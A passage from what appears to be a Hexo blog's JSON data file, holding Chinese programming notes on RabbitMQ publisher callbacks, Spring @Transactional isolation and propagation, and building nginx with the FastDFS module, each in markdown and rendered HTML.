System.out.println(\"cause\" + cause);</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n\n        rabbitClient<span class=\"token punctuation\">.</span><span class=\"token function\">setReturnsCallback</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">RabbitTemplate<span class=\"token punctuation\">.</span>ReturnsCallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n            <span class=\"token comment\">/**\n             * 只要消息没有投递给指定的队列，就触发这个回调\n             * @param returned 返回的消息和元数据\n             */</span>\n            <span class=\"token annotation punctuation\">@Override</span>\n            <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">returnedMessage</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ReturnedMessage</span> returned<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"returned\"</span> <span class=\"token operator\">+</span> returned<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"本地事务","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-26T03:06:50.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"mysql本地事务","_content":"## 本地事务\n```java\n /**\n     * 本地事务注解@Transactional\n     *\n     * 事务隔离级别设置\n     * @Transactional(isolatfion = Isolation.REPEATABLE_READ)\n     *\n     *  事务隔离级别(从小到大)：\n     *      READ_UNCOMMITTED(未读提交)：可以读到其他没有提交得事务得数据，这个现象也称之为脏数据，别人可能异常回滚，那么读到得就是无效数据\n     *           公司发工资了，领导把5000元打到singo的账号上，但是该事务并未提交，\n     *           而singo正好去查看账户，发现工资已经到账，是5000元整，非常高 兴。\n     *           可是不幸的是，领导发现发给singo的工资金额不对，是2000元，于是迅速回滚了事务，\n     *           修改金额后，将事务提交，最后singo实际的工资只有 2000元，singo空欢喜一场\n     *\n     *      READ_COMMITTED(读提交)：一个事务可以读取另一个已经提交得事务，多次读取会造成不一样得结果，这个现象称为不可重复读问题\n     *           singo拿着工资卡去消费，系统读取到卡里确实有2000元，而此时她的老婆也正好在网上转账，\n     *           把singo工资卡的2000元转到另一账户，并在 singo之前提交了事务，当singo扣款时，\n     *           系统检查到singo的工资卡已经没有钱，扣款失败，singo十分纳闷，明明卡里有钱\n     *\n     *      REPEATABLE_READ(可重复读)：MySQL得默认隔离级别，在同一个事务里，select得结果是事务开始时间点状态，因此同样得select操作读到得结果是一样得，但是会有幻读现象\n     *          当隔离级别设置为Repeatable read 时，可以避免不可重复读。当singo拿着工资卡去消费时，\n     *          一旦系统开始读取工资卡信息（即事务开始），singo的老婆就不可能对该记录进行修改，也就是singo的老婆不能在此时转账\n     *\n     *          事务A在执行读取操作，需要两次统计数据的总量，前一次查询数据总量后，此时事务B执行了新增数据的操作并提交后，\n     *          这个时候事务A读取的数据总量和之前统计的不一样，就像产生了幻觉一样，平白无故的多了几条数据，成为幻读\n     *      SERIALIZABLE(序列化)：在这个隔离级别下事务都是串行顺序执行得\n     *\n     * 事务得传播行为设置\n     * @Transactional(propagation = Propagation.REQUIRED)\n     *\n     *  事务得传播行为：\n     *      PROPAGATION_REQUIRED:如果当前没有事务，就创建一个新的事务，如果当前存在事务，就加入该事务，使用当前事务得配置 最常用 默认\n     *      PROPAGATION_SUPPORTS:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事物执行\n     *      PROPAGATION_MANDATORY:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以抛出异常\n     *      PROPAGATION_REQUIRED_NEW:创建新事务，无论当前村不存在事务，都创新事务,使用新得配置\n     *      PROPAGATION_NOT_SUPPORTED:以非事务方式执行操作，如果当前存在事务，就吧当前事务挂起\n     *      PROPAGATION_NEVER:以非事务方式执行操作，如果当前存在事务，则抛出异常\n     *      PROPAGATION_NESTED:如果当前存在事务，则在嵌套事务内执行，如果当前没有事务，则执行和PROPAGATION_REQUIRED相似得操作\n     *\n     */\n```\n\n### 事务隔离级别设置\n```java\n// 事务隔离级别设置\n@Transactional(isolation = Isolation.REPEATABLE_READ)\npublic void a(){\n        /**\n         * b();\n         * c();\n         * 如果a，b，c三个事务是在同一个类中，那么b，c做的人和设置都没用，都是和a共用一个事务 直接这样调用就是吧c，b得代码放到了a中\n         *\n         * 因为事务是使用代理对象来控制得，所以调用本类得其他事务，那么其他事务失效，但是可以调用其他类得事务\n         * 如果要调用本类得事务，解决办法如下:\n         *      引入spring-boot-starter-aop,要使用aspectjweaver代理\n         *      开启aspectjweaver动态代理功能@EnableAspectJAutoProxy(exposeProxy = true) 配置是对外暴露代理对象 以后所有得动态代理都是aspectjweaver来创建(没有接口也能创建)\n         *      用代理对象调用\n         */\n\n\n        OrderServiceImpl orderService = (OrderServiceImpl) AopContext.currentProxy();\n        orderService.b();\n        orderService.c();\n\n        // a和b都在一个事务里面\n        // c是一个新得事务\n        // 出现异常之后，如果a或者b出现异常，那么a和b都会回滚 c不回滚   如果是c出现异常，只是c回滚\n        }\n```\n\n### 事务的传播行为设置\n```java\n// 事务得传播行为设置\n@Transactional(propagation = Propagation.REQUIRED)\npublic void b(){\n\n}\n\n// 事务得传播行为设置\n@Transactional(propagation = Propagation.REQUIRES_NEW)\npublic void c(){\n\n}\n```","source":"_posts/本地事务.md","raw":"---\ntitle: 本地事务\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-26 11:06:50\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: mysql本地事务\ntags: LocalTransactional\ncategories: db\n---\n## 本地事务\n```java\n /**\n     * 本地事务注解@Transactional\n     *\n     * 事务隔离级别设置\n     * @Transactional(isolatfion = Isolation.REPEATABLE_READ)\n     *\n     *  事务隔离级别(从小到大)：\n     *      READ_UNCOMMITTED(未读提交)：可以读到其他没有提交得事务得数据，这个现象也称之为脏数据，别人可能异常回滚，那么读到得就是无效数据\n     *           公司发工资了，领导把5000元打到singo的账号上，但是该事务并未提交，\n     *           而singo正好去查看账户，发现工资已经到账，是5000元整，非常高 兴。\n     *           可是不幸的是，领导发现发给singo的工资金额不对，是2000元，于是迅速回滚了事务，\n     *           修改金额后，将事务提交，最后singo实际的工资只有 2000元，singo空欢喜一场\n     *\n     *      READ_COMMITTED(读提交)：一个事务可以读取另一个已经提交得事务，多次读取会造成不一样得结果，这个现象称为不可重复读问题\n     *           singo拿着工资卡去消费，系统读取到卡里确实有2000元，而此时她的老婆也正好在网上转账，\n     *           把singo工资卡的2000元转到另一账户，并在 singo之前提交了事务，当singo扣款时，\n     *           系统检查到singo的工资卡已经没有钱，扣款失败，singo十分纳闷，明明卡里有钱\n     *\n     *      REPEATABLE_READ(可重复读)：MySQL得默认隔离级别，在同一个事务里，select得结果是事务开始时间点状态，因此同样得select操作读到得结果是一样得，但是会有幻读现象\n     *          当隔离级别设置为Repeatable read 时，可以避免不可重复读。当singo拿着工资卡去消费时，\n     *          一旦系统开始读取工资卡信息（即事务开始），singo的老婆就不可能对该记录进行修改，也就是singo的老婆不能在此时转账\n     *\n     *          事务A在执行读取操作，需要两次统计数据的总量，前一次查询数据总量后，此时事务B执行了新增数据的操作并提交后，\n     *          这个时候事务A读取的数据总量和之前统计的不一样，就像产生了幻觉一样，平白无故的多了几条数据，成为幻读\n     *      SERIALIZABLE(序列化)：在这个隔离级别下事务都是串行顺序执行得\n     *\n     * 事务得传播行为设置\n     * @Transactional(propagation = Propagation.REQUIRED)\n     *\n     *  事务得传播行为：\n     *      PROPAGATION_REQUIRED:如果当前没有事务，就创建一个新的事务，如果当前存在事务，就加入该事务，使用当前事务得配置 最常用 默认\n     *      PROPAGATION_SUPPORTS:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事物执行\n     *      PROPAGATION_MANDATORY:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以抛出异常\n     *      PROPAGATION_REQUIRED_NEW:创建新事务，无论当前村不存在事务，都创新事务,使用新得配置\n     *      PROPAGATION_NOT_SUPPORTED:以非事务方式执行操作，如果当前存在事务，就吧当前事务挂起\n     *      PROPAGATION_NEVER:以非事务方式执行操作，如果当前存在事务，则抛出异常\n     *      PROPAGATION_NESTED:如果当前存在事务，则在嵌套事务内执行，如果当前没有事务，则执行和PROPAGATION_REQUIRED相似得操作\n     *\n     */\n```\n\n### 事务隔离级别设置\n```java\n// 事务隔离级别设置\n@Transactional(isolation = Isolation.REPEATABLE_READ)\npublic void a(){\n        /**\n         * b();\n         * c();\n         * 如果a，b，c三个事务是在同一个类中，那么b，c做的人和设置都没用，都是和a共用一个事务 直接这样调用就是吧c，b得代码放到了a中\n         *\n         * 因为事务是使用代理对象来控制得，所以调用本类得其他事务，那么其他事务失效，但是可以调用其他类得事务\n         * 如果要调用本类得事务，解决办法如下:\n         *      引入spring-boot-starter-aop,要使用aspectjweaver代理\n         *      开启aspectjweaver动态代理功能@EnableAspectJAutoProxy(exposeProxy = true) 配置是对外暴露代理对象 以后所有得动态代理都是aspectjweaver来创建(没有接口也能创建)\n         *      用代理对象调用\n         */\n\n\n        OrderServiceImpl orderService = (OrderServiceImpl) AopContext.currentProxy();\n        orderService.b();\n        orderService.c();\n\n        // a和b都在一个事务里面\n        // c是一个新得事务\n        // 出现异常之后，如果a或者b出现异常，那么a和b都会回滚 c不回滚   如果是c出现异常，只是c回滚\n        }\n```\n\n### 事务的传播行为设置\n```java\n// 事务得传播行为设置\n@Transactional(propagation = Propagation.REQUIRED)\npublic void b(){\n\n}\n\n// 事务得传播行为设置\n@Transactional(propagation = Propagation.REQUIRES_NEW)\npublic void c(){\n\n}\n```","slug":"本地事务","published":1,"updated":"2023-03-10T02:51:52.397Z","_id":"cldcjex9v0003s8vk1nakby5v","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"本地事务\"><a href=\"#本地事务\" class=\"headerlink\" title=\"本地事务\"></a>本地事务</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">/**\n    * 本地事务注解@Transactional\n    *\n    * 事务隔离级别设置\n    * @Transactional(isolatfion = Isolation.REPEATABLE_READ)\n    *\n    *  事务隔离级别(从小到大)：\n    *      READ_UNCOMMITTED(未读提交)：可以读到其他没有提交得事务得数据，这个现象也称之为脏数据，别人可能异常回滚，那么读到得就是无效数据\n    *           公司发工资了，领导把5000元打到singo的账号上，但是该事务并未提交，\n    *           而singo正好去查看账户，发现工资已经到账，是5000元整，非常高 兴。\n    *           可是不幸的是，领导发现发给singo的工资金额不对，是2000元，于是迅速回滚了事务，\n    *           修改金额后，将事务提交，最后singo实际的工资只有 2000元，singo空欢喜一场\n    *\n    *      READ_COMMITTED(读提交)：一个事务可以读取另一个已经提交得事务，多次读取会造成不一样得结果，这个现象称为不可重复读问题\n    *           singo拿着工资卡去消费，系统读取到卡里确实有2000元，而此时她的老婆也正好在网上转账，\n    *           把singo工资卡的2000元转到另一账户，并在 singo之前提交了事务，当singo扣款时，\n    *           系统检查到singo的工资卡已经没有钱，扣款失败，singo十分纳闷，明明卡里有钱\n    *\n    *      REPEATABLE_READ(可重复读)：MySQL得默认隔离级别，在同一个事务里，select得结果是事务开始时间点状态，因此同样得select操作读到得结果是一样得，但是会有幻读现象\n    *          当隔离级别设置为Repeatable read 时，可以避免不可重复读。当singo拿着工资卡去消费时，\n    *          一旦系统开始读取工资卡信息（即事务开始），singo的老婆就不可能对该记录进行修改，也就是singo的老婆不能在此时转账\n    *\n    *          事务A在执行读取操作，需要两次统计数据的总量，前一次查询数据总量后，此时事务B执行了新增数据的操作并提交后，\n    *          这个时候事务A读取的数据总量和之前统计的不一样，就像产生了幻觉一样，平白无故的多了几条数据，成为幻读\n    *      SERIALIZABLE(序列化)：在这个隔离级别下事务都是串行顺序执行得\n    *\n    * 事务得传播行为设置\n    * @Transactional(propagation = Propagation.REQUIRED)\n    *\n    *  事务得传播行为：\n    *      PROPAGATION_REQUIRED:如果当前没有事务，就创建一个新的事务，如果当前存在事务，就加入该事务，使用当前事务得配置 最常用 默认\n    *      PROPAGATION_SUPPORTS:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事物执行\n    *      PROPAGATION_MANDATORY:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以抛出异常\n    *      PROPAGATION_REQUIRED_NEW:创建新事务，无论当前村不存在事务，都创新事务,使用新得配置\n    *      PROPAGATION_NOT_SUPPORTED:以非事务方式执行操作，如果当前存在事务，就吧当前事务挂起\n    *      PROPAGATION_NEVER:以非事务方式执行操作，如果当前存在事务，则抛出异常\n    *      PROPAGATION_NESTED:如果当前存在事务，则在嵌套事务内执行，如果当前没有事务，则执行和PROPAGATION_REQUIRED相似得操作\n    *\n    */</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"事务隔离级别设置\"><a href=\"#事务隔离级别设置\" class=\"headerlink\" title=\"事务隔离级别设置\"></a>事务隔离级别设置</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// 事务隔离级别设置</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>isolation <span class=\"token operator\">=</span> <span class=\"token class-name\">Isolation</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REPEATABLE_READ</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">/**\n         * b();\n         * c();\n         * 如果a，b，c三个事务是在同一个类中，那么b，c做的人和设置都没用，都是和a共用一个事务 直接这样调用就是吧c，b得代码放到了a中\n         *\n         * 因为事务是使用代理对象来控制得，所以调用本类得其他事务，那么其他事务失效，但是可以调用其他类得事务\n         * 如果要调用本类得事务，解决办法如下:\n         *      引入spring-boot-starter-aop,要使用aspectjweaver代理\n         *      开启aspectjweaver动态代理功能@EnableAspectJAutoProxy(exposeProxy = true) 配置是对外暴露代理对象 以后所有得动态代理都是aspectjweaver来创建(没有接口也能创建)\n         *      用代理对象调用\n         */</span>\n\n\n        <span class=\"token class-name\">OrderServiceImpl</span> orderService <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">OrderServiceImpl</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">AopContext</span><span class=\"token punctuation\">.</span><span class=\"token function\">currentProxy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        orderService<span class=\"token punctuation\">.</span><span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        orderService<span class=\"token punctuation\">.</span><span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// a和b都在一个事务里面</span>\n        <span class=\"token comment\">// c是一个新得事务</span>\n        <span class=\"token comment\">// 出现异常之后，如果a或者b出现异常，那么a和b都会回滚 c不回滚   如果是c出现异常，只是c回滚</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"事务的传播行为设置\"><a href=\"#事务的传播行为设置\" class=\"headerlink\" title=\"事务的传播行为设置\"></a>事务的传播行为设置</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// 事务得传播行为设置</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>propagation <span class=\"token operator\">=</span> <span class=\"token class-name\">Propagation</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REQUIRED</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 事务得传播行为设置</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>propagation <span class=\"token operator\">=</span> <span class=\"token class-name\">Propagation</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REQUIRES_NEW</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"本地事务\"><a href=\"#本地事务\" class=\"headerlink\" title=\"本地事务\"></a>本地事务</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">/**\n    * 本地事务注解@Transactional\n    *\n    * 事务隔离级别设置\n    * @Transactional(isolatfion = Isolation.REPEATABLE_READ)\n    *\n    *  事务隔离级别(从小到大)：\n    *      READ_UNCOMMITTED(未读提交)：可以读到其他没有提交得事务得数据，这个现象也称之为脏数据，别人可能异常回滚，那么读到得就是无效数据\n    *           公司发工资了，领导把5000元打到singo的账号上，但是该事务并未提交，\n    *           而singo正好去查看账户，发现工资已经到账，是5000元整，非常高 兴。\n    *           可是不幸的是，领导发现发给singo的工资金额不对，是2000元，于是迅速回滚了事务，\n    *           修改金额后，将事务提交，最后singo实际的工资只有 2000元，singo空欢喜一场\n    *\n    *      READ_COMMITTED(读提交)：一个事务可以读取另一个已经提交得事务，多次读取会造成不一样得结果，这个现象称为不可重复读问题\n    *           singo拿着工资卡去消费，系统读取到卡里确实有2000元，而此时她的老婆也正好在网上转账，\n    *           把singo工资卡的2000元转到另一账户，并在 singo之前提交了事务，当singo扣款时，\n    *           系统检查到singo的工资卡已经没有钱，扣款失败，singo十分纳闷，明明卡里有钱\n    *\n    *      REPEATABLE_READ(可重复读)：MySQL得默认隔离级别，在同一个事务里，select得结果是事务开始时间点状态，因此同样得select操作读到得结果是一样得，但是会有幻读现象\n    *          当隔离级别设置为Repeatable read 时，可以避免不可重复读。当singo拿着工资卡去消费时，\n    *          一旦系统开始读取工资卡信息（即事务开始），singo的老婆就不可能对该记录进行修改，也就是singo的老婆不能在此时转账\n    *\n    *          事务A在执行读取操作，需要两次统计数据的总量，前一次查询数据总量后，此时事务B执行了新增数据的操作并提交后，\n    *          这个时候事务A读取的数据总量和之前统计的不一样，就像产生了幻觉一样，平白无故的多了几条数据，成为幻读\n    *      SERIALIZABLE(序列化)：在这个隔离级别下事务都是串行顺序执行得\n    *\n    * 事务得传播行为设置\n    * @Transactional(propagation = Propagation.REQUIRED)\n    *\n    *  事务得传播行为：\n    *      PROPAGATION_REQUIRED:如果当前没有事务，就创建一个新的事务，如果当前存在事务，就加入该事务，使用当前事务得配置 最常用 默认\n    *      PROPAGATION_SUPPORTS:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以非事物执行\n    *      PROPAGATION_MANDATORY:支持当前事务，如果当前存在事务，就加入该事务，如果当前不存在事务，就以抛出异常\n    *      PROPAGATION_REQUIRED_NEW:创建新事务，无论当前村不存在事务，都创新事务,使用新得配置\n    *      PROPAGATION_NOT_SUPPORTED:以非事务方式执行操作，如果当前存在事务，就吧当前事务挂起\n    *      PROPAGATION_NEVER:以非事务方式执行操作，如果当前存在事务，则抛出异常\n    *      PROPAGATION_NESTED:如果当前存在事务，则在嵌套事务内执行，如果当前没有事务，则执行和PROPAGATION_REQUIRED相似得操作\n    *\n    */</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"事务隔离级别设置\"><a href=\"#事务隔离级别设置\" class=\"headerlink\" title=\"事务隔离级别设置\"></a>事务隔离级别设置</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// 事务隔离级别设置</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>isolation <span class=\"token operator\">=</span> <span class=\"token class-name\">Isolation</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REPEATABLE_READ</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">/**\n         * b();\n         * c();\n         * 如果a，b，c三个事务是在同一个类中，那么b，c做的人和设置都没用，都是和a共用一个事务 直接这样调用就是吧c，b得代码放到了a中\n         *\n         * 因为事务是使用代理对象来控制得，所以调用本类得其他事务，那么其他事务失效，但是可以调用其他类得事务\n         * 如果要调用本类得事务，解决办法如下:\n         *      引入spring-boot-starter-aop,要使用aspectjweaver代理\n         *      开启aspectjweaver动态代理功能@EnableAspectJAutoProxy(exposeProxy = true) 配置是对外暴露代理对象 以后所有得动态代理都是aspectjweaver来创建(没有接口也能创建)\n         *      用代理对象调用\n         */</span>\n\n\n        <span class=\"token class-name\">OrderServiceImpl</span> orderService <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">OrderServiceImpl</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">AopContext</span><span class=\"token punctuation\">.</span><span class=\"token function\">currentProxy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        orderService<span class=\"token punctuation\">.</span><span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        orderService<span class=\"token punctuation\">.</span><span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// a和b都在一个事务里面</span>\n        <span class=\"token comment\">// c是一个新得事务</span>\n        <span class=\"token comment\">// 出现异常之后，如果a或者b出现异常，那么a和b都会回滚 c不回滚   如果是c出现异常，只是c回滚</span>\n        <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"事务的传播行为设置\"><a href=\"#事务的传播行为设置\" class=\"headerlink\" title=\"事务的传播行为设置\"></a>事务的传播行为设置</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// 事务得传播行为设置</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>propagation <span class=\"token operator\">=</span> <span class=\"token class-name\">Propagation</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REQUIRED</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">b</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// 事务得传播行为设置</span>\n<span class=\"token annotation punctuation\">@Transactional</span><span class=\"token punctuation\">(</span>propagation <span class=\"token operator\">=</span> <span class=\"token class-name\">Propagation</span><span class=\"token punctuation\">.</span><span class=\"token constant\">REQUIRES_NEW</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>"},{"title":"nginx+fdfs搭建","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-19T08:23:26.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"nginx+fdfs搭建","_content":"## Nginx+FastDfs\n[hfdfs项目](https://github.com/happyfish100)     fdfs和那llibfastcommon依赖还有fdfs-ngx-module还有nginx链接模块都可以直接克隆相对应仓库\n\n### 安装nginx及fastdfs-nginx-module\n\n#### 解压缩 fastdfs-nginx-module-master.zip\n\n```shell\nsudo ./configure --prefix=/usr/local/nginx/ --add-module=fastdfs-nginx-module-master解压后的目录的绝对路径/src\n```\n\n#### 如果nginx还没安装执行\n```shell\nsudo ./make\nsudo ./make install\n```\n```shell\n./configure --with-http_ssl_module --with-openssl=../openssl-1.1.1m  --with-pcre=../pcre-8.42 --with-zlib=../zlib-1.2.11 --prefix=/usr/local/nginx/ --add-module=/usr/share/fastdfs/fastdfs-nginx-module-master/src\n```\n\n#### 如果nginx安装了执行\n> sudo ./make\n\n```shell\nsudo cp fastdfs-nginx-module-master解压后的目录中src下的mod_fastdfs.conf  /etc/fdfs/mod_fastdfs.conf\n```\n> sudo vim /etc/fdfs/mod_fastdfs.conf\n\n```text\n修改内容：\n\nconnect_timeout=10\n\ntracker_server=自己ubuntu虚拟机的ip地址:22122\n\nurl_have_group_name=true\n\nstore_path0=/home/python/fastdfs/storage\n```\n\n> sudo cp 解压缩的fastdfs-master目录中的http.conf  /etc/fdfs/http.conf\n\n> sudo cp 解压缩的fastdfs-master目录中的mime.types /etc/fdfs/mime.types\n\n> sudo vim /usr/local/nginx/conf/nginx.conf\n\n> 在http部分中添加配置信息如下(反向代理)：\n\n```shell\nserver {\n\n        listen       8888;\n\n        server_name  localhost;\n\n        location ~/group[0-9]/ {\n\n            ngx_fastdfs_module;\n\n        }\n\n        error_page   500 502 503 504  /50x.html;\n\n        location = /50x.html {\n\n        root   html;\n\n        }\n\n}\n```\n#### 启动nginx\n```shell\nsudo /usr/local/nginx/sbin/nginx\n```\n\n> 在换ip之后，storage.conf和client.conf还有mod_fastdfs.cong\n\n\n#### python使用fdfs\n\n```shell\npip install fdfs_client-py-master.zip\n\n>>> from fdfs_client.client import Fdfs_client\n\n>>> client = Fdfs_client('/etc/fdfs/client.conf')\n\n>>> ret = client.upload_by_filename('test')\n\n>>> ret\n```\n```\n{'Groupname':'group1','Status':'Uploadsuccessed.','Remotefile_id':'group1/M00/00/00/wKjzh0_xaR63RExnAAAaDqbNk5E1398.py','Uploadedsize':'6.0KB','Localfilename':'test', 'Storage IP':'192.168.243.133'}\n    ```","source":"_posts/nginx-fdfs搭建.md","raw":"---\ntitle: nginx+fdfs搭建\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-19 16:23:26\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: nginx+fdfs搭建\ntags: fdfs\ncategories: 工具\n---\n## Nginx+FastDfs\n[hfdfs项目](https://github.com/happyfish100)     